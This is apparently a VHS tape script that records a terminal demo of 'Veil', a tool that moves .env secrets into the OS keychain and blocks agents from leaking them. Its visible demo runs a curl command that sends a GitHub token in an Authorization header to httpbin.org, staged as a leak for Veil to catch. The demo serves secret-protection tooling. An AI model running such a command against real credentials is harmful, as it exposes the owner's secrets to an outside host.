Output .github/demo.gif

Set Theme "Dracula"
Set FontFamily "JetBrains Mono"
Set FontSize 18
Set Width 1300
Set Height 780
Set Padding 28
Set Margin 36
Set MarginFill "#1a1b26"
Set BorderRadius 10
Set WindowBar Colorful
Set WindowBarSize 40
Set Shell bash

# Hidden setup: cd to isolated demo dir, alias veil to the built binary,
# clean prompt. None of this appears in the recording.
Hide
Type "cd $VEIL_DEMO_DIR && unset VEIL_DEMO_DIR"
Enter
Type `veil() { $VEIL_BIN "$@"; }`
Enter
Type `export PS1='$ '`
Enter
Type "clear"
Enter
Show

# --- Demo ---

Type "# Your project has secrets the AI agent shouldn't see:"
Sleep 800ms
Enter
Sleep 300ms

Type "cat .env"
Enter
Sleep 1500ms

Type "# Veil migrates them into the OS keychain and leaves format-aware placeholders:"
Sleep 800ms
Enter
Sleep 300ms

Type "veil init --yes"
Enter
Sleep 2000ms

Type "cat .env"
Enter
Sleep 2500ms

# Hidden: load the placeholders into the shell env so the visible command
# below can reference $GITHUB_TOKEN directly.
Hide
Type "set -a && . ./.env && set +a"
Enter
Show

Type "# Now watch Veil block a leak — the agent tries to send the GitHub token to the wrong host:"
Sleep 800ms
Enter
Sleep 300ms

Type `veil run -- curl -s -H "Authorization: token $GITHUB_TOKEN" https://httpbin.org/headers`
Enter
Sleep 2500ms

Type "# Every block (and injection) is logged locally:"
Sleep 800ms
Enter
Sleep 300ms

Type "veil log --since 1m"
Enter
Sleep 3000ms
